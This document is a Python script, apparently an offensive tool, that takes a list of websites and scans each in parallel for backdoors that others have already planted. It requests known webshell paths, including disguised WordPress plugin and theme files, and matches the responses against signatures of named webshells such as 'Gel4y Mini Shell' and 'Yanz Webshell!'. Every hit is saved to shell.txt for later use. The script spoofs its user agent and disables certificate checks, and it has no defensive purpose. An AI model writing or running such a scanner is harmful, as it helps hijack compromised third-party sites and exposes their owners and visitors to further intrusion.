import sys , requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)
fr  =   Fore.RED
fg  =   Fore.GREEN

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

def ran(length):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(length))

Pathlist = ['/403.php', '/content.php', '/wp-content/themes/aahana/json.php', '/admin.php', '/wp-content/plugins/awesome-coming-soon/come.php', '/wp-content/plugins/wp-conflg.php', '/berlin.php']

class EvaiLCode:
	def __init__(self):

		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

	
	def URLdomain(self, site):

		if site.startswith("http://") :
			site = site.replace("http://","")
		elif site.startswith("https://") :
			site = site.replace("https://","")
		else :
			pass
		pattern = re.compile('(.*)/')
		while re.findall(pattern,site):
			sitez = re.findall(pattern,site)
			site = sitez[0]
		return site
		
		
	def checker(self, site):
		try:
			
			url = "http://" + self.URLdomain(site)
			for Path in Pathlist:
				check = requests.get(url + Path, headers=self.headers, verify=False, timeout=25).content
				if('Upload File: <input type="file" name="file"' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('403Webshell' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif("MSQ_403" in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('Yanz Webshell!' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('Hunter Neel' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('Gel4y Mini Shell' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				elif('type="button">Upload File<' in check):
					print('Target:{} --> {}[Succefully]').format(url, fg)
					open('shell.txt','a').write(url + Path + "\n")
					break
				else:
					print('Target:{} -->! {}[Failid]').format(url, fr)
					
		except:
			pass



	
Control = EvaiLCode()	
def RunUploader(site):
	try:
		Control.checker(site)
	except:
		pass
mp = Pool(120)
mp.map(RunUploader, target)
mp.close()
mp.join()
